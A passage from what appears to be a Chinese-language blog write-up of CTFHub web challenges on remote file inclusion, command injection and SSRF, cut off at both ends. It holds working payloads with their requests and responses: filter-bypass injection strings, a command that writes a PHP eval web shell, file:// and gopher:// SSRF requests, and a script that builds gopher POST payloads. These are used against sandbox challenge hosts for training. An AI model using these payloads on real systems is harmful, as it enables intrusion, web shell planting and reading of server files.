class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:53:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>112</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;db258363d74e58371cd85c86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>解法2：</li>
</ul>
<p> 题目目的是想让我们自己搭个服务器，然后让靶机远程包含我们的代码，但是我并没有租赁VPS。</p>
<p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC">参考答案</a></p>
<h4><span id="命令注入">命令注入</span></h4><p> 命令行注入漏洞是指web应用程序中调用了系统可执行命令的函数，而且输入参数是可控的，如果黑客拼接了注入命令，就可以进行非法操作了。</p>
<p><strong>Windows系统支持的管道符如下：</strong></p>
<ol>
<li>“|”：直接执行后面的语句。</li>
<li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li>
<li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li>
<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
</ol>
<p><strong>Linux系统支持的管道符如下：</strong></p>
<ol>
<li>“;”：执行完前面的语句再执行后面的语句。</li>
<li>“|”：显示后面语句的执行结果。</li>
<li>“||”：当前面的语句执行出错时，执行后面的语句。</li>
<li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
</ol>
<ul>
<li><p>解法一：使用base64编码</p>
<ul>
<li><p>我们在框内输入</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # 输出两个php文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #根目录没发现其他可疑文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # 未回显</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #使用base64编码</span><br><span class="line"># 解码后获得&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>解法二：重定向</p>
<ul>
<li>我们可以用重定向的方法注入一个一句话木马</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>使用蚁剑连接即可</li>
</ul>
</li>
</ul>
<h4><span id="过滤cat">过滤cat</span></h4><p>3.使用单引号绕过 </p>
<p>127.0.0.1; c’’at flag_2287214057241.php |base64<br>4.使用双引号绕过 </p>
<p>127.0.0.1; c””at flag_2287214057241.php |base64<br>5.利用Shell 特殊变量绕过</p>
<p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p>
<h4><span id="过滤空格">过滤空格</span></h4><p>空格可以用以下字符代替：<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</code>等</p>
<p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
<h4><span id="过滤目录分割符">过滤目录分割符</span></h4><p>思路上来说应该是cat文件，必须要使用目录分隔符&#x2F;，但是题目给过滤。需要另外寻找办法  </p>
<ul>
<li>法一：使用cd绕开</li>
</ul>
<p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p>
<p>windows中：<code>%0a、&amp;、|</code></p>
<p>其中分号;的作用就是在 shell 中，担任”连续指令”功能</p>
<p>&amp;&amp;的方式：command1 &amp;&amp; command2 如果command1执行成功，则执行command2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag_is_here;cat flag_164641924722716.php|base64</span><br></pre></td></tr></table></figure>

<h4><span id="过滤运算符">过滤运算符</span></h4><ul>
<li>发现题目没有过滤<code>;</code>因此我们可以直接使用</li>
<li>在f12中的pre标签里面有注释</li>
</ul>
<h4><span id="综合练习">综合练习</span></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45897324/article/details/109271622">url查看表</a></p>
<ul>
<li><p>题解一</p>
<p>%0a 代替 换行 ，<code>%09</code>代替 TAB键 （因为flag被过滤了，所以我们通过TAB来补全flag_is_here ）<code>%5c</code> 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了qwq）</p>
<p>这题得在地址栏输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als</span><br><span class="line">?ip=127.0.0.1%0als%09*is_here</span><br><span class="line">? # 查看flag_is_here文件夹下的文件ip=127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># 注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</span><br><span class="line">　　%5c代替\（用\来分隔开cat，因为cat也被过滤了qwq）</span><br></pre></td></tr></table></figure>

<p>在f12中能看到答案</p>
<figure class="highlight plaintext"><figcaption><span>source可以用ls sour\*，还可以使用ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 题解二</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#x27;&#x27;t$&#123;IFS&#125;fl$a*g_230191972813921.php # 因为过滤了cat，我们这里使用单引号绕过过滤，如ca&#x27;&#x27;t 构造payload</span><br></pre></td></tr></table></figure>

<p>其中<code>&#39;&#39;</code>可以用<code>%27</code>代替，将cat的任意字母包裹。</p>
</li>
</ul>
<h3><span id="ssrf">SSRF</span></h3><blockquote>
<p>SSRT(Server-Side Request Forgery，服务器端请求伪造)，就是攻击者利用服务器能访问其他的服务器的功能，通过自己的构造服务器请求来攻击与外界不相连接的内网，我们知道内网与外网是不相通的，所以利用这一个特性，就可以利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。</p>
</blockquote>
<p><img src="/2023/03/29/ctf/a622392d2eac336271e32e052def5adc.png" alt="ssrf"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/124697338">reference</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p>
<ul>
<li>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行</li>
<li>数据流末尾使用%0d%0a代表消息结束</li>
</ul>
<p><strong>关于url编码问题</strong></p>
<p>第一，利用ssrf经常要进行多次url编码（传参或者多次跳转需要多次url编码，也就是说，有多少次请求就要编码多少次，直接curl后接gopher:&#x2F;&#x2F;就编码一次，利用?url&#x3D;gopher:&#x2F;&#x2F;这样的形式进行ssrf利用就相当于请求了两次，需要编码两次，如果有302跳转，则还需要再编码），第一次url编码后，将所有%0a改成%0¢%0a<br>gopher:&#x2F;默认发送到70端口，一般我们需要发送到80端口，记得改</p>
<h4><span id="内网访问">内网访问</span></h4><ul>
<li><p>考察<code>http://</code>协议</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="伪协议读取文件">伪协议读取文件</span></h4><ul>
<li><p>这一题的考点主要是<strong>file协议</strong>读取文件</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="端口扫描">端口扫描</span></h4><ul>
<li>考察<code>dict://</code>协议</li>
</ul>
<p>使用burp suite进行端口扫描</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=dict://127.0.0.1:§§</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>  然后注入使用数字从8000-9000，步进为1，发现端口<code>8243</code>的数据长度不一致。使用<code>http://</code>访问，<em>http可以忽略</em></p>
  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure>

<h4><span id="post请求">POST请求</span></h4><ul>
<li><p>使用dirsearch对服务器底下的目录进行扫描</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://challenge-c81b1dbf4106f429.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>file</code>协议对index.php页面<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">源码</a>进行读取</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>发送</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>返回</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>题目意思是要构造一个POST请求，传参key</li>
</ul>
<p>访问<code>http://127.0.0.1/flag.php</code> 发现</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=21327983b7a37abf3ace93cc0e64f15f--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。所以我们需要两次编码</p>
<ul>
<li><p><strong>构造gopher协议</strong></p>
<ul>
<li>在gopher协议中发送HTTP的数据，需要以下三步：</li>
</ul>
<p>1、构造HTTP数据包</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.构造HTTP数据包</span></span><br><span class="line">raw = <span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">key=21327983b7a37abf3ace93cc0e64f15f&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>2、URL编码、替换回车换行为%0d%0a</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL编码、替换回车换行为%0d%0a</span></span><br><span class="line">data = raw.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(data))</span><br></pre></td></tr></table></figure>

<p>3、发送gopher协议，有的教程说后面要加结束符<code>%0d%0a</code>，但是这道题貌似不用</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21327983b7a37abf3ace93cc0e64f15f</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>结果</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>206</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line">  </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:43 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line">  </span><br><span class="line">ctfhub&#123;dbcc1a3f4c6fb16d610f70aa&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="上传文件">上传文件</span></h4><ol>
<li>查看源代码</li>
</ol>
<p>发送</p>
  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回</p>
